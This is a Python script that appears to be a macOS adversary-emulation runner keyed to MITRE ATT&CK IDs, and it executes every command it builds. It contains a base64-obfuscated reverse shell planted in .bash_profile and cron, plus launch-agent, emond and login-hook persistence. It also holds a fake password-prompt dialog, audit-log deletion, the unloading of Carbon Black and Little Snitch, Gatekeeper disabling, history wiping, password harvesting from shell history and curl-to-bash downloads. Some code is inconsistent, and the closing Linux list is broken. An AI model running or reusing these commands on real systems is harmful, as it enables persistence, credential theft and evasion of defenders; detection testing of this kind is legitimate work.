import os, datetime
import logging
import sys


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


cwd = os.getcwd()
evil_cmd = '''python -c \\"import os, base64;exec(base64.b64decode('aW1wb3J0IHNvY2tldCAsICAgc3VicHJvY2VzcyAsICAgb3MgIDsgICAgaG9zdD0iMTI3LjAuMC4xIiAgOyAgICBwb3J0PTQ0NCAgOyAgICBzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQgLCAgIHNvY2tldC5TT0NLX1NUUkVBTSkgIDsgICAgcy5jb25uZWN0KChob3N0ICwgICBwb3J0KSkgIDsgICAgb3MuZHVwMihzLmZpbGVubygpICwgICAwKSAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCkgLCAgIDEpICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSAsICAgMikgIDsgICAgcD1zdWJwcm9jZXNzLmNhbGwoIi9iaW4vYmFzaCIp'))\\"'''

usernames = ['user1', 'user2', 'user3', 'user4', 'user5', 'user6']

T1136 = '''
sudo dscl . -create /Users/''' + usernames[0] + '''
sudo dscl . -create /Users/''' + usernames[1] + ''' UserShell /bin/bash
sudo dscl . -create /Users/''' + usernames[2] + ''' RealName "T1136"
sudo dscl . -create /Users/''' + usernames[3] + ''' UniqueID "1010"
sudo dscl . -create /Users/''' + usernames[4] + ''' PrimaryGroupID 80
sudo dscl . -create /Users/''' + usernames[5] + ''' NFSHomeDirectory /Users/''' + usernames[5]

T1150_value = '''
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.example.my-fancy-task</string>
    <key>OnDemand</key>
    <true/>
    <key>ProgramArguments</key>
    <array>
        <string>T1150-test1</string>
        <string>T1150-test2</string>
    </array>
    <key>StartInterval</key>
    <integer>1800</integer>
</dict>
</plist>
'''

T1150_value_1 = "/bin/bash"
T1150_value_2 = cwd + "/T1547_011.sh"

userName = os.popen('whoami').read().strip('\n')

if userName != "root":
    T1547_011_fileName = '/Users/' + str(userName) + '/Library/LaunchAgents/com.example.my-fancy-task.plist'
    T1547_011_file = open(T1547_011_fileName, 'w')
    T1547_011_file.write(T1150_value)
    T1547_011_file.close()
    T1547_011_part_I = "sed -i.bu 's/T1150-test1/\/bin\/bash/g' ~/Library/LaunchAgents/com.example.my-fancy-task.plist"
    T1547_011_part_II = "sed -i.bu 's/T1150-test2/%s/g' ~/Library/LaunchAgents/com.example.my-fancy-task.plist" % T1150_value_2.replace('/', '\/')
else:
    T1547_011_fileName = '/Library/LaunchAgents/com.example.my-fancy-task.plist'
    T1547_011_file = open(T1547_011_fileName, 'w')
    T1547_011_file.write(T1150_value)
    T1547_011_file.close()
    T1547_011_part_I = "sed -i.bu 's/T1150-test1/\/bin\/sh/g' ~/Library/LaunchAgents/com.example.my-fancy-task.plist"
    T1547_011_part_II = "sed -i.bu 's/T1150-test2/%s/g' ~/Library/LaunchAgents/com.example.my-fancy-task.plist" % T1150_value_2.replace('/', '\/')

T1569_001_app = 'T1569_001.app'
T1569_001 = '''launchctl submit -l T1569-launchctl-persistence -- ''' + T1569_001_app

T1546_005_url = 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1546.005/src/echo-art-fish.sh'
T1546_005 = '''
trap 'nohup curl -sS ''' + T1546_005_url + ''' | bash' EXIT
exit
trap 'nohup curl -sS ''' + T1546_005_url + ''' | bash' INT
'''

T1546_004 = '''
echo "''' + str(evil_cmd) + '''" >> ~/.bash_profile
'''

T1059_002 = '''
osascript -e "do shell script \\"python -c \\\\\\"import base64,sys,socket,commands,os,ssl;exec(base64.b64decode('aW1wb3J0IHNvY2tldCAsICAgc3VicHJvY2VzcyAsICAgb3MgIDsgICAgaG9zdD0iMTI3LjAuMC4xIiAgOyAgICBwb3J0PTQ0NCAgOyAgICBzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQgLCAgIHNvY2tldC5TT0NLX1NUUkVBTSkgIDsgICAgcy5jb25uZWN0KChob3N0ICwgICBwb3J0KSkgIDsgICAgb3MuZHVwMihzLmZpbGVubygpICwgICAwKSAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCkgLCAgIDEpICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSAsICAgMikgIDsgICAgcD1zdWJwcm9jZXNzLmNhbGwoIi9iaW4vYmFzaCIp'));\\\\\\"\\""
'''


T1037_002_value_2 = cwd + "/T1037_002.sh"

T1037_002 = '''
sudo touch /private/var/root/Library/Preferences/com.apple.loginwindow.plist
sudo defaults write com.apple.loginwindow LoginHook ''' + str(T1037_002_value_2) + '''
'''

T1546_014_value = '''
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.example.my-fancy-task</string>
    <key>OnDemand</key>
    <true/>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>T1546-test2</string>
    </array>
    <key>StartInterval</key>
    <integer>1800</integer>
</dict>
</plist>
'''

T1547_011_value_1 = cwd + "/T1547_011.sh"

T1546_014_fileName = '/etc/emond.d/rules/T1165_emond.plist'
T1546_014_file = open('/tmp/T1165_emond.plist', 'w')
T1546_014_file.write(T1150_value)
T1546_014_file.close()

T1547_011_part_I = "sudo cp /tmp/T1165_emond.plist /etc/emond.d/rules/T1165_emond.plist"
T1547_011_part_II = "sudo sed -i.bu 's/T1546-test2/%s/g' /etc/emond.d/rules/T1165_emond.plist" % T1547_011_value_1.replace('/', '\/')

T1546_014_fileName_Part_II = '/private/var/db/emondClients/T1546_014'
T1546_014_file_II = open('/tmp/T1546_014', 'w')
T1546_014_file_II.write(T1546_014_value)
T1546_014_file_II.close()

T1547_011_part_III = 'sudo cp /tmp/T1546_014 /private/var/db/emondClients/T1546_014'
T1547_011_part_IV = "sudo sudo sed -i.bu 's/T1546-test2/%s/g' /private/var/db/emondClients/T1546_014" % T1547_011_value_1.replace('/', '\/')

T1053_003 = '''
echo "''' + str(evil_cmd) + '''" > /tmp/T1053_003.sh 
chmod +x /tmp/T1053_003.sh
echo "* * * * * /tmp/T1053_003.sh" > /tmp/T1053_003_crontab
crontab /tmp/T1053_003_crontab
'''


T1141 = '''
osascript -e 'tell application "System Preferences" to display dialog "Software Update requires that you type your password to apply changes." & return & return default answer "" with icon 1 with title "Software Update" with hidden answer'
'''

# DEFENSE EVASION

T1070 = '''
sudo rm -rf /private/var/logfile/system.logfile*
sudo rm -rf /private/var/audit/*
'''

T1562_tool_I = '/Library/LaunchDaemons/com.carbonblack.daemon.plist'
T1562_tool_II = '/Library/LaunchDaemons/at.obdev.littlesnitchd.plist'
T1562_tool_III = '/Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist'

T1562 = '''
sudo launchctl unload ''' + T1562_tool_I + '''
sudo launchctl unload ''' + T1562_tool_II + '''
sudo launchctl unload ''' + T1562_tool_III

T1548_001_osx_c_file = '''
#include <unistd.h> 

main() 
{         
    char *ls[3];         
    ls[0] = "/bin/cat";         
    ls[1] = "/etc/osxshadow";         
    ls[2] =  NULL;         
    execve(ls[0],ls,NULL); 
}
'''

makefile = '''
all: T1548_001.c
	gcc -static -g -o T1548_001 T1548_001.c
'''

T1548_001_c_file = open('T1548_001.c', 'w')
T1548_001_c_file.write(T1548_001_osx_c_file)
T1548_001_c_file.close()

T1548_001_makefile = open('makefile', 'w')
T1548_001_makefile.write(makefile)
T1548_001_makefile.close()

T1548_001 = '''
make T1548_001
sudo chown root T1548_001
sudo chmod u+s T1548_001
echo "If you can read this file , it means T1548_001 executed as expected. The super secret admin password is qwerty123" >  /tmp/osxshadow
sudo cp /tmp/osxshadow /etc/
sudo chown root  /etc/osxshadow
sudo chmod 400  /etc/osxshadow
'''


T1070_006 = '''
touch -a -t 197001010000.00 /tmp/T1070-006-1
touch -m -t 197001010000.00 /tmp/T1070-006-2	
touch T1070-006-3
SetFile -d '8/23/1989 12:59:59' T1070-006-3
stat T1070-006-3
'''

# TESTING DIFFERS BASED ON OS FLAVOR

T1553_004_ssl_dir = "/etc/ssl/certs/"

T1553_004 = '''
openssl req -subj '/CN=Temporary Cert/O=Temporary Cert/C=US' -new -newkey rsa:2048 -sha256 -days 365 -nodes -x509 -keyout T1130-key.pem -out T1130-cert.pem
sudo cp T1130-cert.pem ''' + T1553_004_ssl_dir + '''
'''

# DETERMINA APPPATH

T1553_001_app_path = "T1553_001.app"

T1553_001 = '''
sudo xattr -r -d com.apple.quarantine ''' + T1553_001_app_path + '''
sudo spctl --master-disable
'''

T1562_003 = '''
export HISTCONTROL=ignoreboth
set +o history
history -c
set -o history
'''

# CRED ACCESS

T1552_003 = '''
cat ~/.bash_history | grep 'pass\|ssh\|rdesktop' > /tmp/T1139.txt
'''

# DOWNLOAD CERTIFICATE

T1555_001 = '''
security -h
security find-certificate -a -p > allcerts.pem
security import T1130-cert.pem
'''

# EXECUTION

T1059_004_url = 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh'

T1059_004 = '''
bash -c "curl -sS ''' + T1059_004_url + ''' | bash"
'''

# bash -c "wget --quiet -O - ''' + T1059_004_url + ''' | bash"

# FOR MAC 

TTP_NUMBERS_MAC = ["T1136", "T1547_011_part_I", "T1547_011_part_II", "T1569_001", "T1546_005", "T1546_004", "T1059_002", "T1037_002", "T1547_011_part_I", "T1547_011_part_II", "T1547_011_part_III", "T1547_011_part_IV","T1053_003", "T1141", "T1070", "T1562", "T1548_001", "T1070_006", "T1553_004", "T1553_001", "T1562_003", "T1552_003", "T1555_001", "T1059_004"]

TTP_LIST_MAC = [T1136, T1547_011_part_I, T1547_011_part_II, T1569_001, T1546_005, T1546_004, T1059_002, T1037_002, T1547_011_part_I, T1547_011_part_II, T1547_011_part_III, T1547_011_part_IV, T1053_003, T1141, T1070, T1562,
                T1548_001, T1070_006, T1553_004, T1553_001, T1562_003, T1552_003, T1555_001, T1059_004]


for i in range(len(TTP_LIST_MAC)):
    try:
        print(datetime.datetime.now())
        print("")
        print(bcolors.BOLD + bcolors.FAIL + "Executing " + bcolors.OKGREEN + TTP_NUMBERS_MAC[i] + bcolors.ENDC)
        print("")
        print(TTP_LIST_MAC[i])
        print("")
        if TTP_NUMBERS_MAC[i] == "T1562":
            print (bcolors.BOLD + bcolors.WARNING + 'If you see error in this section , it means you need to change the name / path of the plist to target the services you want to disable.\n' + bcolors.ENDC)
        os.popen(TTP_LIST_MAC[i]).read()  # UNCOMMENT THIS WHEN YOU PLAN TO EXECUTE THE TTPS
        print('-'*80)
        with open('log.txt', 'a') as log:
            log.write(str(datetime.datetime.now()))
            log.write("\n\n")
            log.write(bcolors.BOLD + bcolors.FAIL + "Executing " + bcolors.OKGREEN + TTP_NUMBERS_MAC[i] + bcolors.ENDC)
            log.write("\n")
            log.write(TTP_LIST_MAC[i])
            log.write("\n")
            log.write("------------------------------------------------------------------------------------------------------------------------------------------------------\n\n")
        print("\n")
    except:
        print ("Could not execute : " + str(TTP_LIST_MAC[i]))


print(bcolors.BOLD + bcolors.WARNING + "MANUALLY RUN ./T1548_001 AS NON ROOT USER\n\n" + bcolors.ENDC)

'''

For LINUX Use following List

TTP_NUMBERS_LINUX = ["T1154", "T1156", "T1168", "T1166", "T1099", "T1130", "T1148", "T1151", "T1139", "T1142", "T1139", "T1155", "T1059", "T1002", "T1022"]]

TTP_LIST_LINUX = [ T1154, T1156, T1159, T1168, T1166, T1099, T1130, T1148, T1151, T1139, T1142, T1139, T1155, T1059, T1002, T1022]

'''

